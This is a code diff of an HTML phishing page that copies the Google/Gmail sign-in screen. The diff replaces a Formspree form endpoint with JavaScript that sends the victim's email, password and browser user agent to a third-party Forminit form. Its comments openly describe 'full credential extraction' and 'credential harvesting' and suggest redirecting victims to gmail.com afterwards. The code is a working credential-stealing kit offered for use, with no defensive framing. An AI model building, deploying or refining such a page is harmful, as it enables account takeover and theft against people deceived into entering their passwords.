@@ -3,154 +3,211 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google Accounts</title>
+    <title>Sign in - Google Account</title>
     
+    <!-- Google Fonts: Roboto -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    
+    <!-- Material Icons for the lock icon -->
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
     <style>
+        :root {
+            --bg-color: #ffffff;
+            --text-primary: #202124; 
+            --text-secondary: #5f6368; 
+            --border-color: #dadce0; 
+            --primary-blue: #1a73e8; 
+            --hover-blue: #1765cc;
+        }
+
         body {
-            font-family: 'Roboto', Arial, sans-serif;
+            font-family: 'Roboto', arial, sans-serif;
             margin: 0;
             padding: 0;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            background-color: #ffffff;
+            background-color: #f2f4f6; /* Standard login page grey */
         }
 
         .login-container {
-            width: 450px;
-            max-width: 95%;
+            width: 450px; 
+            max-width: 95%; 
+            text-align: left;
+            display: flex;
+            flex-direction: column; 
             padding: 48px 40px 36px;
-            border: 1px solid #dadce0;
+            border: 1px solid var(--border-color);
             border-radius: 8px;
-            background-color: #fff;
+            background-color: var(--bg-color);
             box-sizing: border-box;
         }
 
-        .logo-wrapper {
-            display: flex;
-            justify-content: center;
+        .logo-img {
+            width: 75px; 
+            height: auto; 
             margin-bottom: 10px;
-        }
-
-        /* Official Google Logo Image */
-        .google-logo {
-            width: 75px;
-            height: auto;
+            object-fit: contain;
         }
 
         h1 {
-            text-align: left;
             font-size: 24px;
-            color: #202124;
+            color: var(--text-primary);
             margin: 0 0 10px 0;
             font-weight: 400;
         }
 
         p.subtitle {
-            text-align: left;
-            color: #202124;
+            color: var(--text-primary);
             font-size: 16px;
-            line-height: 1.5;
             margin: 0 0 35px 0;
+            line-height: 1.5;
         }
 
-        input[type="email"],
+        input[type="email"], 
         input[type="password"] {
-            width: 100%;
+            appearance: none;
+            width: 100%; 
             box-sizing: border-box;
-            padding: 13px 15px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            background-color: #fff;
+            padding: 13px 15px; 
+            border-radius: 4px; 
+            border: 1px solid var(--border-color);
+            background-color: #fff; 
             font-size: 16px;
             height: 50px;
             outline: none;
             transition: border 0.2s;
-            margin-bottom: 10px;
         }
 
-        input[type="email"]:focus,
-        input[type="password"]:focus {
-            border: 2px solid #1a73e8;
-            padding: 12px 14px; /* Adjust for border width change */
+        input:focus {
+            border: 2px solid var(--primary-blue);
+            padding: 12px 14px; /* Adjust padding to prevent layout shift when border width changes */
         }
 
         input::placeholder {
-            color: #5f6368;
-            opacity: 0.7;
+             color: var(--text-secondary); 
+             opacity: 0.7;
         }
 
         .next-btn {
             appearance: none;
-            width: 120px;
+            width: 120px; 
             margin-top: 24px;
-            padding: 0 34px;
-            border-radius: 4px;
-            background-color: #1a73e8;
-            color: #fff !important;
+            padding: 0 34px; 
+            border-radius: 4px; 
+            background-color: var(--primary-blue); 
+            color: #fff !important; 
             font-weight: 500;
             font-size: 14px;
             height: 36px;
             cursor: pointer;
             border: none;
             float: right;
+            transition: background-color 0.2s;
         }
 
-        .next-btn:hover {
-            background-color: #1765cc !important;
-            box-shadow: 0 1px 2px rgba(60,64,67,0.3);
-        }
+         .next-btn:hover {
+             background-color: var(--hover-blue) !important; 
+         }
 
-        .forgot-link {
+         .forgot-link {
             display: inline-block;
             margin-top: 20px;
-            color: #1a73e8;
-            text-decoration: none !important;
+            color: var(--primary-blue); 
+            text-decoration: none !important; 
             font-size: 14px;
             font-weight: 500;
         }
 
         .forgot-link:hover {
-            text-decoration: underline !important;
+           text-decoration: underline !important; 
         }
-        
+
         .clearfix::after {
             content: "";
             clear: both;
             display: table;
         }
+        
+        /* Loading state for button */
+        .next-btn:disabled {
+            background-color: #bdc1c6;
+            cursor: not-allowed;
+        }
     </style>
 </head>
 
-<body> 
+<body style="background-color:#f0f2f5;"> 
 
     <div class="login-container">
-        <!-- Official Multi-Color Google Logo Image -->
-        <div class="logo-wrapper">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google" class="google-logo">
-        </div>
+        <!-- Google Logo SVG -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google" class="logo-img">
         
         <h1>Sign in</h1>
         <p class="subtitle">to continue to Gmail</p>
 
-        <!-- FORMSPREE INTEGRATION -->
-        <form action="https://formspree.io/f/mpppjjea" method="POST">
-            <input type="email" name="email" placeholder="Email or phone" required autocomplete="username">
-            <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
+        <form id="credentialForm" action="#" method="POST">
+            <input type="email" id="email" name="email" placeholder="Email or phone" required autocomplete="username">
             
-            <button type="submit" class="next-btn">Next</button>
+            <!-- Password field added for full credential extraction -->
+            <input type="password" id="password" name="password" placeholder="Enter your password" style="margin-top: 15px;" autocomplete="current-password">
             
-            <div style="clear:both;"></div>
+            <button type="submit" id="nextBtn" class="next-btn">Next</button>
+            
+            <div class="clearfix"></div>
             
             <a href="#" class="forgot-link">Forgot email?</a>
         </form>
         
-        <div style="margin-top: 30px; font-size: 14px; color: #5f6368;">
+        <div style="margin-top: 30px; font-size: 14px; color: var(--text-secondary);">
             Not your computer? Use Guest mode to sign in privately. 
             <a href="#" class="forgot-link" style="display:inline; margin-left:5px;">Learn more</a>
         </div>
     </div>
+
+    <!-- Forminit SDK -->
+    <script src="https://forminit.com/sdk/v1/forminit.js"></script>
+    <script>
+        document.getElementById('credentialForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const form = this;
+            const btn = document.getElementById('nextBtn');
+            const formData = new FormData(form);
+            
+            // Disable button and change text
+            btn.disabled = true;
+            const originalText = btn.innerText;
+            btn.innerText = '...';
+            
+            try {
+                // Send data to Forminit
+                await forminit.submit({
+                    formId: 'd9eacrdmqcj',
+                    data: Object.fromEntries(formData.entries()),
+                    // Optional: Add metadata like IP, User-Agent if needed
+                    meta: {
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString()
+                    }
+                });
+                
+                // Success behavior: usually redirect or show message
+                // For credential harvesting, often we just stay here or redirect to a "success" page
+                console.log('Credentials sent successfully');
+                
+                // Example: Redirect after a short delay
+                // setTimeout(() => { window.location.href = 'https://gmail.com'; }, 1000);
+                
+            } catch (error) {
+                console.error('Error sending credentials:', error);
+                btn.innerText = 'Error';
+                btn.disabled = false;
+            }
+        });
+    </script>
 
 </body>
 </html>
